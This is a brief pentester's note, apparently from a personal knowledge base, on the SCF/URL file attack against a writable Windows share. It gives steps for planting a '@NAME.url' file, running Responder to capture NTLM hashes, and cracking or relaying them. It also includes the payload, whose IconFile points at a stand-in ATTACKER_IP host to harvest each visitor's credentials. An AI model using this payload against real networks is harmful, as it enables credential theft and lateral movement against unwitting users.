# Overview
to execute this attack we need to have writable share and add our script in it 
and name the file "@NAME.url"
and then run responder
once the user access the share file the hash will be dumped in responder
you can try to crack the hash or use [smbrelay](SMB_Relay)

Script:

```powershell
URL=blah
WorkingDirectory=blah # or URL
IconFile=\\ATTACKER_IP\%USERNAME%.icon
Resources:
```

---
Tags: #AD #social_engineering #SCF #smb 
Resources:[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share) 